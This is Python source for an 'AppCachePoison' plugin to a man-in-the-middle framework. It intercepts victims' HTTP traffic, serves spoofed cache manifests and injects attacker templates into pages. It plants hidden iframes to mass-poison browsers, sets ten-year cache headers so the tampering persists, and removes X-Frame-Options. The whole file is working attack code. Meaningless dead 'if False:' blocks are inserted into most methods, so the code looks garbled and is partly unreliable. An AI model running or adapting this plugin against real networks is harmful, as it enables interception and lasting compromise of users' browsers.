import re
import os.path
import time
import sys
from datetime import date
from plugins.plugin import Plugin

class AppCachePlugin(Plugin):
    name = 'AppCachePoison'
    optname = 'appoison'
    desc = 'Performs App Cache Poisoning attacks'
    version = '0.3'

    def initialize(self, options):
        if False:
            i = 10
            return i + 15
        self.options = options
        self.mass_poisoned_browsers = []
        from core.sslstrip.URLMonitor import URLMonitor
        self.urlMonitor = URLMonitor.getInstance()
        self.urlMonitor.caching = True
        self.urlMonitor.setAppCachePoisoning()

    def response(self, response, request, data):
        if False:
            print('Hello World!')
        self.app_config = self.config['AppCachePoison']
        url = request.client.uri
        req_headers = request.client.getAllHeaders()
        headers = request.client.responseHeaders
        ip = request.client.getClientIP()
        if 'enable_only_in_useragents' in self.app_config:
            regexp = self.app_config['enable_only_in_useragents']
            if regexp and (not re.search(regexp, req_headers['user-agent'])):
                self.clientlog.info('Tampering disabled in this useragent ({})'.format(req_headers['user-agent']), extra=request.clientInfo)
                return {'response': response, 'request': request, 'data': data}
        urls = self.urlMonitor.getRedirectionSet(url)
        self.clientlog.debug('Got redirection set: {}'.format(urls), extra=request.clientInfo)
        section = False
        for url in urls:
            for name in self.app_config:
                if isinstance(self.app_config[name], dict):
                    section = self.app_config[name]
                    if section.get('manifest_url', False) == url:
                        self.clientlog.info("Found URL in section '{}'!".format(name), extra=request.clientInfo)
                        self.clientlog.info('Poisoning manifest URL', extra=request.clientInfo)
                        data = self.getSpoofedManifest(url, section)
                        headers.setRawHeaders('Content-Type', ['text/cache-manifest'])
                    elif section.get('raw_url', False) == url:
                        self.clientlog.info("Found URL in section '{}'!".format(name), extra=request.clientInfo)
                        p = self.getTemplatePrefix(section)
                        self.clientlog.info('Poisoning raw URL', extra=request.clientInfo)
                        if os.path.exists(p + '.replace'):
                            with open(p + '.replace', 'r') as f:
                                data = f.read()
                        elif os.path.exists(p + '.append'):
                            with open(p + '.append', 'r') as f:
                                data += f.read()
                    elif section.get('tamper_url', False) == url or (section.has_key('tamper_url_match') and re.search(section['tamper_url_match'], url)):
                        self.clientlog.info("Found URL in section '{}'!".format(name), extra=request.clientInfo)
                        p = self.getTemplatePrefix(section)
                        self.clientlog.info('Poisoning URL with tamper template: {}'.format(p), extra=request.clientInfo)
                        if os.path.exists(p + '.replace'):
                            with open(p + '.replace', 'r') as f:
                                data = f.read()
                        elif os.path.exists(p + '.append'):
                            with open(p + '.append', 'r') as f:
                                appendix = f.read()
                                data = re.sub(re.compile('</body>', re.IGNORECASE), appendix + '</body>', data)
                        data = re.sub(re.compile('<html', re.IGNORECASE), '<html manifest="' + self.getManifestUrl(section) + '"', data)
        if section is False:
            data = self.tryMassPoison(url, data, headers, req_headers, ip)
        self.cacheForFuture(headers)
        headers.removeHeader('X-Frame-Options')
        return {'response': response, 'request': request, 'data': data}

    def tryMassPoison(self, url, data, headers, req_headers, ip):
        if False:
            while True:
                i = 10
        browser_id = ip + req_headers.get('user-agent', '')
        if not 'mass_poison_url_match' in self.app_config:
            return data
        if browser_id in self.mass_poisoned_browsers:
            return data
        if not headers.hasHeader('content-type') or not re.search('html(;|$)', headers.getRawHeaders('content-type')[0]):
            return data
        if 'mass_poison_useragent_match' in self.app_config and (not 'user-agent' in req_headers):
            return data
        if not re.search(self.app_config['mass_poison_useragent_match'], req_headers['user-agent']):
            return data
        if not re.search(self.app_config['mass_poison_url_match'], url):
            return data
        self.clientlog.debug('Adding AppCache mass poison for URL {}, id {}'.format(url, browser_id), extra=request.clientInfo)
        appendix = self.getMassPoisonHtml()
        data = re.sub(re.compile('</body>', re.IGNORECASE), appendix + '</body>', data)
        self.mass_poisoned_browsers.append(browser_id)
        return data

    def getMassPoisonHtml(self):
        if False:
            i = 10
            return i + 15
        html = '<div style="position:absolute;left:-100px">'
        for i in self.app_config:
            if isinstance(self.app_config[i], dict):
                if self.app_config[i].has_key('tamper_url') and (not self.app_config[i].get('skip_in_mass_poison', False)):
                    html += '<iframe sandbox="" style="opacity:0;visibility:hidden" width="1" height="1" src="' + self.app_config[i]['tamper_url'] + '"></iframe>'
        return html + '</div>'

    def cacheForFuture(self, headers):
        if False:
            print('Hello World!')
        ten_years = 315569260
        headers.setRawHeaders('Cache-Control', ['max-age={}'.format(ten_years)])
        headers.setRawHeaders('Last-Modified', ['Mon, 29 Jun 1998 02:28:12 GMT'])
        in_ten_years = date.fromtimestamp(time.time() + ten_years)
        headers.setRawHeaders('Expires', [in_ten_years.strftime('%a, %d %b %Y %H:%M:%S GMT')])

    def getSpoofedManifest(self, url, section):
        if False:
            print('Hello World!')
        p = self.getTemplatePrefix(section)
        if not os.path.exists(p + '.manifest'):
            p = self.getDefaultTemplatePrefix()
        with open(p + '.manifest', 'r') as f:
            manifest = f.read()
        return self.decorate(manifest, section)

    def decorate(self, content, section):
        if False:
            print('Hello World!')
        for entry in section:
            content = content.replace('%%{}%%'.format(entry), section[entry])
        return content

    def getTemplatePrefix(self, section):
        if False:
            print('Hello World!')
        if section.has_key('templates'):
            return self.app_config['templates_path'] + '/' + section['templates']
        return self.getDefaultTemplatePrefix()

    def getDefaultTemplatePrefix(self):
        if False:
            i = 10
            return i + 15
        return self.app_config['templates_path'] + '/default'

    def getManifestUrl(self, section):
        if False:
            i = 10
            return i + 15
        return section.get('manifest_url', '/robots.txt')